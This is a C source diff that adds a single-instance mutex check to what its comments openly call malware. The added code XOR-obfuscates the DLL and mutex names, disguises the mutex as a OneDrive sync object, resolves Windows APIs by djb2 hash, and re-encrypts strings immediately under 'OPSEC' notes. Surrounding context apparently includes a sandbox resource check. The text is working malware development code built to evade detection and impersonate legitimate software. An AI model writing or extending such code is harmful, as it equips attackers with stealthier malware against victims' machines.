@@ -14,6 +14,54 @@ void xor_crypt(char *data, size_t data_len, const char *key, size_t key_len) {
     // NOTE: no return -> data is modified in RAM
 }
 
+bool check_mutex() {
+
+    LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
+
+    char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
+    
+    // encoded string for Mutex name
+    // NOTE: encrypt the string "Global\\OneDriveSyncMutex" using string_encryptor.py!
+    char enc_mutex[] = { 0x18, 0x1f, 0x1a, 0x12, 0x52, 0x1f, 0x6f, 0x2c, 0x1c, 0x56, 0x30, 0x19, 0x5a, 0x0f, 0x3a, 0x0c, 0x0a, 0x1b, 0x13, 0x7e, 0x06, 0x47, 0x06, 0x0a, 0x33 };
+
+    // API hashes
+    DWORD hash_CreateMutexA = 0x6FA1320D;  // djb2 for "CreateMutexA"
+    DWORD hash_GetLastError = 0x2082EAE3;  // djb2 for "GetLastError"
+
+    // kernel32.dll
+    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
+    HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
+    // OPSEC: recypher DLL name immediately
+    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
+
+    if (!hKernel32) return false;
+
+    // --- dynamic resolution via hashing
+    pCreateMutexA fnCreateMutexA = (pCreateMutexA) get_api_by_hash(hKernel32, hash_CreateMutexA);
+    pGetLastError fnGetLastError = (pGetLastError) get_api_by_hash(hKernel32, hash_GetLastError);
+
+    if (!fnCreateMutexA || !fnGetLastError) return false;
+
+    // decrypt mutex name
+    xor_crypt(enc_mutex, sizeof(enc_mutex), cypher_key, cypher_key_len);
+    
+    // create mutex
+    HANDLE hMutex = fnCreateMutexA(NULL, FALSE, enc_mutex);
+    
+    // OPSEC: recypher immediately
+    xor_crypt(enc_mutex, sizeof(enc_mutex), cypher_key, cypher_key_len);
+
+    // check if it was already running
+    if (fnGetLastError() == ERROR_ALREADY_EXISTS) {
+        // another instance is running, kill current execution
+        return false;
+    }
+
+    // NOTE: Do NOT close hMutex here! 
+    // we want it to remain open as long as the malware is alive.
+    return true;
+}
+
 bool check_resources() {
     // check RAM
     MEMORYSTATUSEX memInfo;
